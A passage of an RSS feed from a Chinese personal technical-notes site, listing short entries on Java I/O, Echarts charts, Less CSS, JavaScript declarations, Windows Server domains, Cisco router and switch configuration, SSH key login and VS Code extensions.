      <description>字节流 package yxzi.xyz;  import java.io.File; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.FileReader;  public class Rainy {  public static void main(String[] args) throws Exception {  File file = new File(&amp;#34;C:\\Users\\admin\\Desktop\\java\\File.txt&amp;#34;); // 字节输入流  FileInputStream wj = new FileInputStream(file);  // 字节输出流  FileOutputStream outinput = new FileOutputStream(&amp;#34;C:\\Users\\admin\\Desktop\\java\\副本.txt&amp;#34;);  // 创建一个字符数组---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  byte arr[] = new byte[1024];  int len = wj.read(arr);  while (len != -1) { // String data = new String(arr); //// System.</description>
    </item>
    
    <item>
      <title>Java 遍历集合</title>
      <link>https://note.yxzi.xyz/note/technology/language/java/%E9%81%8D%E5%8E%86%E9%9B%86%E5%90%88/</link>
      <pubDate>Sat, 20 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/java/%E9%81%8D%E5%8E%86%E9%9B%86%E5%90%88/</guid>
      <description>遍历集合 package Yxzi;  import java.util.ArrayList; import java.util.HashMap; import java.util.Iterator;  public class Test {  public static void main(String[] args) throws Exception {  ArrayList &amp;lt;Student&amp;gt; arr = new ArrayList();   Student obj1 = new Student(&amp;#34;小明&amp;#34;, 23);  Student obj2 = new Student(&amp;#34;小红&amp;#34;, 18);  Student obj3 = new Student(&amp;#34;小花&amp;#34;, 13);  Student obj4 = new Student(&amp;#34;小黑&amp;#34;, 11);  Student obj5 = new Student(&amp;#34;小白&amp;#34;, 23);   arr.add(obj1);  arr.</description>
    </item>
    
    <item>
      <title>Echarts 文字样式</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E6%96%87%E5%AD%97%E6%A0%B7%E5%BC%8F/</link>
      <pubDate>Sat, 13 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E6%96%87%E5%AD%97%E6%A0%B7%E5%BC%8F/</guid>
      <description>文字样式 fontSize: 11, color: &amp;#34;#eee&amp;#34;, textShadowColor: &amp;#34;rgba(0, 0, 0, 1)&amp;#34;, textShadowBlur: 10, textShadowOffsetX: 1, textShadowOffsetY: 1, 图形样式 barBorderRadius: 2, shadowColor: &amp;#34;rgba(0, 0 0, 0.3)&amp;#34;, shadowBlur: 3, shadowOffsetX: 1, shadowOffsetY: 1, </description>
    </item>
    
    <item>
      <title>快速使用 Echarts</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Sat, 13 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8/</guid>
      <description>快速使用 Echarts // 快速使用 Echcarts (function () { 	// 1. 实例化对象 	var myChart = echarts.init(document.querySelector(&amp;#39;&amp;#39;)); 	// 2.配置  	// 3. 把配置给实例对象 	myChart.setOption(option); 	// 4. 让图表跟随屏幕自动的去适应 	window.addEventListener(&amp;#39;resize&amp;#39;, function () { 	myChart.resize(); 	}); })(); </description>
    </item>
    
    <item>
      <title>Echarts 遇到的错误</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E9%81%87%E5%88%B0%E7%9A%84%E9%94%99%E8%AF%AF/</link>
      <pubDate>Sat, 06 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E9%81%87%E5%88%B0%E7%9A%84%E9%94%99%E8%AF%AF/</guid>
      <description>遇到的错误 今天使用 Echarts 绘制地图时，浏览器控制台出现以下错误：
Uncaught DOMException: Failed to execute &amp;#39;drawImage&amp;#39; on &amp;#39;CanvasRenderingContext2D&amp;#39;: The image argument is a canvas element with a width or height of 0. 如何解决
只需要给需要被绘制的元素设置width和height Css 属性即可。</description>
    </item>
    
    <item>
      <title>Echarts 地图</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E5%9C%B0%E5%9B%BE/</link>
      <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E5%9C%B0%E5%9B%BE/</guid>
      <description>地图 常用配置 地图样式 配置 option —&amp;gt; geo —&amp;gt; itemStyle 下的normal .
normal: {  //面积区域颜色  areaColor: &amp;#34;#008C8C&amp;#34;,  // 区域分界线颜色  borderColor: &amp;#34;rgba(43, 196, 243, 1)&amp;#34;,  //区域分界线  borderWidth: 1 }, </description>
    </item>
    
    <item>
      <title>Less &amp; 使用</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/less/-%E7%AC%A6%E5%8F%B7/</link>
      <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/less/-%E7%AC%A6%E5%8F%B7/</guid>
      <description>Less &amp;amp; 使用 在类前面添加了&amp;amp;之后，编译之后的 css 变为且的关系，而没有使用&amp;amp;的 css 是父子的关系
&amp;amp; 符号可以表示对父选择器的引用。 在一个内层选择器的前面，如果没有 &amp;amp; 符号，则这个内层选择器会被解析为父选择器的后代。
如果内层选择器前面有一个 &amp;amp; 符号，则内层选择器会被解析为父选择器自身或父选择器的伪类。
Less 代码 .mainbox {display: flex;min-width: 1024px;max-width: 1920px;margin: 0 auto;padding: 0.125rem 0 0.125rem 0;.column {background-color: yellowgreen;flex: 3;&amp;amp;:nth-child(2) {flex: 5;}}} 解析后的 Css 代码 .mainbox .column:nth-child(2) { 	flex: 5; } 去掉 &amp;amp; 后的 Css 代码 .mainbox .column :nth-child(2) { 	flex: 5; } </description>
    </item>
    
    <item>
      <title>Less 嵌套</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/less/%E5%B5%8C%E5%A5%97/</link>
      <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/less/%E5%B5%8C%E5%A5%97/</guid>
      <description>嵌套 #header { 	color: black; } #header .navigation { 	font-size: 12px; } #header .logo { 	width: 300px; } 用 less 可以这样书写：
#header {color: black;.navigation {font-size: 12px;}.logo {width: 300px;}} &amp;amp; 在选择器前面添加了 &amp;amp; ，表示与父元素是并且关系，而没有使用&amp;amp;的 css 是父子的关系。
&amp;amp; 符号可以表示对父选择器的引用。 在一个内层选择器的前面，如果没有&amp;amp;符号，则这个内层选择器会被编译为父选择器的后代。
如果内层选择器到前面有一个&amp;amp;符号，则内层选择器会被编译为父选择器自身或父选择器的伪类、伪元素等。
div {width: 100px;height: 100px;background-color: firebrick;.indiv {width: 50px;height: 50px;background-color: salmon;&amp;amp;:hover {background-color: aquamarine;}}} 被编译为：</description>
    </item>
    
    <item>
      <title>Less 混合</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/less/%E6%B7%B7%E5%90%88/</link>
      <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/less/%E6%B7%B7%E5%90%88/</guid>
      <description>混合 将一个包含一组属性的规则集引入到另一个规则集的方式。
普通混合 当 less 编译成 css，混合规则集也会被编译到 css 中。这会导致 css 文件过大。
// .MixColor 会被编译到 css 文件中.MixColor {width: 100px;height: 100px;background-color: #008c8c;}.wrap {width: 200px;height: 200px;background-color: firebrick;.indiv {.MixColor;}.indiv2 {.MixColor;}} 为混合规则集加上()，则混合规则集不会被编译到 css 中。
//.MixColor 会被编译到 css 文件中.MixColor() {width: 100px;height: 100px;background-color: #008c8c;}.wrap {width: 200px;height: 200px;background-color: firebrick;.indiv {.MixColor;}.</description>
    </item>
    
    <item>
      <title>域服务器</title>
      <link>https://note.yxzi.xyz/note/technology/windows-server/win-server-%E5%9F%9F%E6%9C%8D%E5%8A%A1%E5%99%A8/</link>
      <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/windows-server/win-server-%E5%9F%9F%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid>
      <description>域服务器 父域一
父域二
子域三
成员四
9 月 30 号 vmware
One
大规模联网用域
小规模联网用组
更大的规模用林
打开 one，和 two，three，fou
更改计算机属性 - 重命名计算机名
设置密码和用户名
设置 ipv4 属性
One
ip 192.168.10.1，255.255.255.0，192.168.10.1
Dns 127.0.0.1，变为 192.168.10.1
Two
ip 地址 192.168.10.2，255.255.255.0，192.168.10.1
Dns 192.168.10.1 变为 192.168.10.2 备用 dns 192.168.10.1
Three
ip 192.168.10.3，255.255.255.0，192.168.10.1
Dns 192.168.10.1
Four
ip 192.168.10.4，255.255.255.0，192.168.10.1
Dns 192.168.10.1
选择 one
服务器管理 - 添加角色 - 服务器角色
勾选 dns 服务器 和 active directory 服务，安装完成后重启
管理工具
本地安全策略 账户策略 密码策略 密码必须符合复杂性要求 禁用</description>
    </item>
    
    <item>
      <title>Echarts 折线图</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E6%8A%98%E7%BA%BF%E5%9B%BE/</link>
      <pubDate>Sat, 30 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E6%8A%98%E7%BA%BF%E5%9B%BE/</guid>
      <description>Echarts 折线图 图表类型 在series下配置type.
type: &amp;#39;line&amp;#39;, 常用配置 标注图表区域 标记图表中某个范围的数据。
在series下配置markArea
markArea: {  data: [  [  {  xAxis: &amp;#39;李宁&amp;#39;  },  {  xAxis: &amp;#39;安踏&amp;#39;  }  ],  [  {  xAxis: &amp;#39;耐克&amp;#39;   },  {  xAxis: &amp;#39;阿迪&amp;#39;  }  ],  ], }, 线条是否平滑显示 在series下配置smooth
smooth: true, 线条样式 在series下配置lineStyle
lineStyle: {  color: &amp;#39;red&amp;#39;,  type: &amp;#39;dashed&amp;#39; } 线条区域样式 在series下配置areaStyle</description>
    </item>
    
    <item>
      <title>Echarts 柱状图</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E6%9F%B1%E7%8A%B6%E5%9B%BE/</link>
      <pubDate>Sat, 30 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E6%9F%B1%E7%8A%B6%E5%9B%BE/</guid>
      <description>Echarts 柱状图 特点 柱状图描述的是分类数据，呈现的是每一个分类中有多少，
通过柱状图，可以很清晰的看出每个分类数据的排名情况。
基本结构 引入 echarts.js 文件, DOM 容器，初始化对象，设置 option。
var myChart = echarts.init(document.getElementById(&amp;#39;main&amp;#39;)); var xArr = [&amp;#39;李宁&amp;#39;, &amp;#39;安踏&amp;#39;, &amp;#39;耐克&amp;#39;] var yArr = [30, 25, 55] var option = {  title: {  text: &amp;#39;运动品牌科技水平&amp;#39;,  link: &amp;#39;https://yxzi.xyz/&amp;#39;  }, }; myChart.setOption(option) X 轴数据 在option下配置 X 轴类型和数据。
xAxis: {  type: &amp;#39;category&amp;#39;,  data: xArr }, Y 轴数据 在option下配置 Y 轴的类型。
yAxis: {  type: &amp;#39;value&amp;#39;, }, 图表类型 在series下配置type.</description>
    </item>
    
    <item>
      <title>Echarts 通用配置</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E9%80%9A%E7%94%A8%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Sat, 30 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E9%80%9A%E7%94%A8%E9%85%8D%E7%BD%AE/</guid>
      <description>Echarts 通用配置 title 图表的标题。
标题的样式 在title下配置textStyle、
textStyle: {  color: &amp;#39;#008c8c&amp;#39;, }, 标题的边框 在title下配置：
borderWidth: 5, borderColor: &amp;#39;#008c8c&amp;#39;, borderRadius: 3, 标题的位置 在title下配置：
left: 10, top: 20, tooltip 提示框组件
用于配置鼠标滑过或点击图表时的提示框。
显示框的触发范围 在tooltip下配置trigger
trigger: &amp;#39;axis&amp;#39;, 显示框触发方式 在tooltip下配置triggerOn
triggerOn: &amp;#39;click &amp;#39;, 自定义提示框内容 字符串模板
formatter: &amp;#39;{b} 的科技水平是 {c}&amp;#39; 回调函数
formatter: function (arg) {  return arg[0].name + &amp;#39;的运动科技水平是&amp;#39; + arg[0].data } toolbox 图表的工具栏。
打开工具栏配置项 feature: { } 导出图片 以图片的形式导出图表
saveAsImage: {}, 数据视图工具 可以展现当前图表所用的数据，编辑后可以动态更新。
dataView: {}, 还原所有配置项 restore: {}, 数据区域的缩放 dataZoom: {}, 图表类型的动态切换 magicType: { 	type: [&amp;#39;bar&amp;#39;, &amp;#39;line&amp;#39;]; } legend 图表的图例组件。它展现了不同系列所对应不同的颜色和名字。可以通过点击某个图例来控制对应的系列显示与否。</description>
    </item>
    
    <item>
      <title>域服务器的基本操作</title>
      <link>https://note.yxzi.xyz/note/technology/windows-server/%E5%9F%9F%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</link>
      <pubDate>Fri, 29 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/windows-server/%E5%9F%9F%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</guid>
      <description>域服务器的基本操作 克隆 2008
打开 ad 01
新建用户
点击新建的用户
隶属于
添加一个
将 2012 升级为域控
添加一个子用户，但无法使用这个用户名登录域服务器
设置
192.168.1.1
255.255.255.0
网关 192.168.1.1
配置 2008
控制面板
网络链接
设置 ip
192.168.1.50
255.255.255.0
192.168.1.1
192.168.1.1
更改计算机名字
加入域
yxzi\user02（2012 域控上添加的用户）
在 2008 上面用 user02 这个用户名登录到域控
打开 ad 01
user 02 属性
账户，登录时间
新建 用户 user03
选择 user03 属性
配置登录名和密码
指定计算机才能登录
登录到，输入 ad 02 的计算机名
ad1 新建组 ts01
添加到组，选择 user02
选择 user03，隶属于，
ts 属性 用户，即可看到
新建 组织单位 danwei</description>
    </item>
    
    <item>
      <title>JavaScrip const</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/const/</link>
      <pubDate>Thu, 28 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/const/</guid>
      <description>const 声明一个常量（一旦声明就无法被修改的量）。
声明时必须赋初始值，声明时使用大写。
常量无法被修改。
块级作用域。
使用const声明的对象和数组，可以修改其属性或元素，因为常量所指向的引用地址并没有改变。</description>
    </item>
    
    <item>
      <title>JavaScrip var、let、count</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/varletcount/</link>
      <pubDate>Thu, 28 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/varletcount/</guid>
      <description>var、let、count 使用var声明的变量，其作用域为该语句所在的函数内，且存在变量提升现象；
使用let声明的变量，其作用域为该语句所在的代码块内，不存在变量提升；
使用const声明的是常量，在后面出现的代码中不能再修改该常量的值。</description>
    </item>
    
    <item>
      <title>JavaScrip 结构赋值</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E5%8F%A5/%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/</link>
      <pubDate>Thu, 28 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E5%8F%A5/%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/</guid>
      <description>结构赋值 结构赋值就是从数组和对象中提取自己想要的变量，然后进行赋值。
数组 将数组中的元素，依次赋给变量。
const arr = [&amp;#39;1&amp;#39;, &amp;#39;2&amp;#39;, &amp;#39;3&amp;#39;, &amp;#39;4&amp;#39;]; let [a, b, c, d] = arr; console.log(a); console.log(b); console.log(c); console.log(d); 对象 将对象中的属性或方法依次赋给变量。
const obj = { 	name: &amp;#39;rainy&amp;#39;, 	age: 21, 	fun() { 	console.log(&amp;#39;method called&amp;#39;); 	}, };  let { name, age, fun } = obj; console.log(name); console.log(age); fun(); </description>
    </item>
    
    <item>
      <title>Cisco 配置默认网关</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E9%BB%98%E8%AE%A4%E7%BD%91%E5%85%B3/</link>
      <pubDate>Wed, 27 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E9%BB%98%E8%AE%A4%E7%BD%91%E5%85%B3/</guid>
      <description>配置默认网关 enableconfigure terminalip default-gateway 192.168.10.1 </description>
    </item>
    
    <item>
      <title>Echarts 基本配置</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Wed, 27 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</guid>
      <description>初始化 初始化一个 Echarts 实例，参数是一个 dom，它决定了图表最终呈现的位置。
var myChart = echarts.init(document.getElementById(&amp;#39;main&amp;#39;)); 绘制图表 用一个对象作为配置项，绘制整个图表。
var option = {}; 标题 title: {  text: &amp;#39;运动品牌科技水平&amp;#39;,  //标题文本点击tiao超链接  link: &amp;#39;https://yxzi.xyz/&amp;#39; }, X 轴 xAxis: {  // 轴类型为类目轴  type: &amp;#39;category&amp;#39;,  // 类目轴的类别名称  data: [&amp;#39;李宁&amp;#39;, &amp;#39;安踏&amp;#39;, &amp;#39;匹克&amp;#39;, &amp;#39;迪卡侬&amp;#39;, &amp;#39;耐克&amp;#39;, &amp;#39;阿迪达斯&amp;#39;] }, Y 轴 yAxis: {  // 轴类型为数值轴，数值轴是不需要设置data属性，  // 因为数值轴针对xAxis的data中的类别名称去series的data中去寻找对应的数据  type: &amp;#39;value&amp;#39;, }, series 一个系列配置。
series: [  {  // 表示下面data中的数据表示的是哪一方面的数据，这里表示的是科技水平  name: &amp;#39;科技水平&amp;#39;,  // 定义图标的类型，这里是柱状图  type: &amp;#39;bar&amp;#39;,  // xAxis 中与类目相对应的数据  data: [22, 15, 12, 15, 80, 40]  }  ] 将配置项设置给 Echarts 实例对象 myChart.</description>
    </item>
    
    <item>
      <title>JavaScrip var</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/var/</link>
      <pubDate>Sat, 23 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/var/</guid>
      <description>var 变量会进行函数声明提升，即预编译处理。</description>
    </item>
    
    <item>
      <title>Cisco Rip 协议</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/rip-%E5%8D%8F%E8%AE%AE/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/rip-%E5%8D%8F%E8%AE%AE/</guid>
      <description>Rip 协议 RIP 协议是比较老的一款动态路由协议，这款协议现在用的已经很少了；
RIP 协议在 IPv4 里分成两个版本，目前就 RIPv2 版本来讲的话，其实也有很多问题，
比如
 根据路由器或者三层转发设备的条数来判断路径优劣这种判断机制是不准确的。 最大条数只有 15 跳也限制了 RIP 的网络规模。 RIP 运行的速度比较慢，而且可能产生环路对网络有很大的影响。  router rip 启用 Rip
version 2 切换到 RipV2 版本
network 通告该路由器的所有直连网络，通告之后，
该路由器的路由表就会显示除了通告外的所有网络的路由表的本地接口和远程网络的数量是一样的.
show ip protocol 显示该路由器的路由协议，路由表前面的大写字母叫做路由来源
no auto-summary 禁用该路由器上的自动汇总
passive-interface g0/1 将连接局域网的接口 g 0/1 配置为被动接口，
default-information originate 配置路由器的完全指定默认路由的默认信息来源</description>
    </item>
    
    <item>
      <title>Cisco SSH 取代 Telnet</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/ssh-%E5%8F%96%E4%BB%A3-telnet/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/ssh-%E5%8F%96%E4%BB%A3-telnet/</guid>
      <description>SSH 取代 Telnet 远程登录 进入 PC 的 Desktop，选择 Command Prompt，
输入密码并登录。
保护密码
进入特权模式，保存
加密密码 在全局模式下：
Serverce password-encryption SSH 加密通信 ip domian-name usernameip ssh version 2crypto key generate rsa </description>
    </item>
    
    <item>
      <title>Cisco 琐碎知识点</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9/</guid>
      <description>琐碎知识点 C 直连网络
L 本地接口
S 静态路由
汇总路由的作用 将多条路由汇总为一条，减少路由表体积
浮动静态路由的作用 配置静态路由的同时，再后面手动配置一个默认的管理距离
默认静态路由的 ipv4 地址 0.0.0.0 0.0.0.0
ACL 是控制列表
控制列表最后一条是默认拒绝语句
ACL 的两种类型 标准 ACL ，扩展类型 ACL
通配符掩码中的 0 是全匹配 1 是全忽略
通配符掩码是 子网反掩码
host 表示 0.0.0.0
静态路由 目标地址 送出接口或吓一跳
递归静态路由（吓一跳静态路由）
完全指定路由（接口和下一跳都配置）
子网掩码 24 可以包含多少个网络位
网络位 只有八位
全 0 为 网络地址
全 1 为广播地址
rip 动态协议
汇总路由
进站 in
出站 out
三个接口
每个接口有都有一个 in 或 out
一共可以写 6 个 ACL
每个 in 和每个 out 都可以写 ipv4 或 ipv6 的地址</description>
    </item>
    
    <item>
      <title>Cisco 配置中继</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%BB%A7/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%BB%A7/</guid>
      <description>配置中继 进交换机的全局
interface f 0/1 switchport mode trunk switchport trunk native vlan 99 </description>
    </item>
    
    <item>
      <title>Cisco 配置交换机端口安全</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%AB%AF%E5%8F%A3%E5%AE%89%E5%85%A8/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%AB%AF%E5%8F%A3%E5%AE%89%E5%85%A8/</guid>
      <description>配置交换机端口安全 配置 S1
enable configure terminal 配置端口模式 interface f 0/1 switchport mode access 打开端口的安全模式 switch port-security //开启f0/1端口的安全功能 switchport port-security maximum 1 // 配置该端口的最大连接数为 1（最大能配置为128 switch） switchport port-security mac-address sticky // 让交换机口主动记下最先插入设备的 MAC 地址。 switchport port-security violation restrict //针对不合法的MAC地址连接该端口，配置端口的处理模式为：（protect[丢弃数据包，不发警告] | restrict[丢弃数据包，在 console 发警告] | shutdown[关]） no shutdown 、 exit </description>
    </item>
    
    <item>
      <title>Cisco 配置单臂路由</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1/</guid>
      <description>配置单臂路由 拓扑图 三台 PC
中间一台交换机
一台路由器在交换机上方
将交换机与路由器连起来
配置 S1 进全局模式 enable configure terminal hostname S1  vlan 10 exit  vlan 20 exit  vlan 30 exit 将指定 access 端口分配给指定 vlan interface f 0/2switchport acces vlan 10exitinterface f 0/3switchport acces vlan 20exitinterface f 0/4switchport acces vlan 30exi 将二层端口配置成 trunk 模式 interface g 0/1switchport mode trunk 配置 R1 enableconfigure terminalhostname R1 配置虚拟子端口 interface g 0/0.</description>
    </item>
    
    <item>
      <title>Hugo 命令</title>
      <link>https://note.yxzi.xyz/note/technology/frame/hugo/%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/hugo/%E5%91%BD%E4%BB%A4/</guid>
      <description>Hugo 命令 hugo new site MyBlog 创建一个新的站点文件夹
hugo new Article/first.md hugo -t ThemeName hugo -D 构建静态页面</description>
    </item>
    
    <item>
      <title>SHH 密钥登录</title>
      <link>https://note.yxzi.xyz/note/technology/linux/shh-%E5%AF%86%E9%92%A5%E7%99%BB%E9%99%86/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/linux/shh-%E5%AF%86%E9%92%A5%E7%99%BB%E9%99%86/</guid>
      <description>SHH 密钥登录 用 xshell 生成密钥 新建用户密钥生成向导
输入密钥长度，比如 2024，下一步
输入密钥名称、密码，下一步
将公钥保存为文件，完成
将公钥上传到服务器 我这里用的服务器是 Linux，以及宝塔面板。
进入服务器的**/root/.ssh路径，在这个文件夹中新建authorized_keys文件，并将之前保存的公钥中的文件内容复制到新建的authorized_keys**文件中。
配置 sshd_config 找到服务器下的**/etc/ssh/sshd_config**，点击编辑。
核对文件中的内容是否与一下内容一致，不一致请作出对应的的修改。
注意，一下内容前面的注释符号**#**请删掉。
AuthorizedKeysFile .ssh/authorized_keys PasswordAuthentication no </description>
    </item>
    
    <item>
      <title>Vs Code 使用 Git</title>
      <link>https://note.yxzi.xyz/note/technology/softwareuse/vscode/%E4%BD%BF%E7%94%A8-git/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/softwareuse/vscode/%E4%BD%BF%E7%94%A8-git/</guid>
      <description>使用 Git 注意本地密钥是否和远程的密钥一样。</description>
    </item>
    
    <item>
      <title>Vs Code 扩展</title>
      <link>https://note.yxzi.xyz/note/technology/softwareuse/vscode/%E6%89%A9%E5%B1%95/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/softwareuse/vscode/%E6%89%A9%E5%B1%95/</guid>
      <description>Vs Code 扩展 Bracket Pair Colorizer 给匹配的括号着色
Path Intellisense 自动完成文件名
Material Icon Theme 好看的文件图标
Prettier - Code formatter 更优雅的代码格式化。vscode 里比较优秀的一个格式化插件。
VS Code Counter 统计代码总行数、注释行数、空白行数，以及使用的语言。
使用方法：右键需要统计的文件夹—Count lines in directory
Power Mode 一款超级炫酷的编辑代码的插
HTML Snippets 非常实用的 HTML 代码片段以及提示
Atuo Rename Tag 修改 html 标签，自动帮你完成尾部闭合标签的同步修改
Code Runner 能够运行多种语言的代码片段或代码文件：JavaScript，C，C ++，Java，PHP，Python，Perl，Ruby，Go 等等
Easy LESS 保存style.less后，会自动生成style.css到当前路径
px to rem &amp;amp; rpx 实现 px 和 rem 单位之间转换，并支持 WXSS。
Markdown Preview Mermaid Support markdown 支持思维导图
Vetur vue 补全</description>
    </item>
    
    <item>
      <title>WinSCP SSH 密钥登录</title>
      <link>https://note.yxzi.xyz/note/technology/linux/winscp-ssh-%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/linux/winscp-ssh-%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95/</guid>
      <description>WinSCP SSH 密钥登录 WinSCP -&amp;gt; 高级 -&amp;gt; SSH -&amp;gt; 验证 -&amp;gt; 密钥文件</description>
    </item>
    
    <item>
      <title>制作光晕</title>
      <link>https://note.yxzi.xyz/note/technology/software/photoshop/%E5%88%B6%E4%BD%9C%E5%85%89%E6%99%95/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/software/photoshop/%E5%88%B6%E4%BD%9C%E5%85%89%E6%99%95/</guid>
      <description>制作光晕  新建透明图层。 将该图层填充为纯黑色。 菜单栏——滤镜——渲染——镜头光晕——调整参数——确定。  </description>
    </item>
    
    <item>
      <title>制作剪影</title>
      <link>https://note.yxzi.xyz/note/technology/software/photoshop/%E5%88%B6%E4%BD%9C%E5%89%AA%E5%BD%B1/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/software/photoshop/%E5%88%B6%E4%BD%9C%E5%89%AA%E5%BD%B1/</guid>
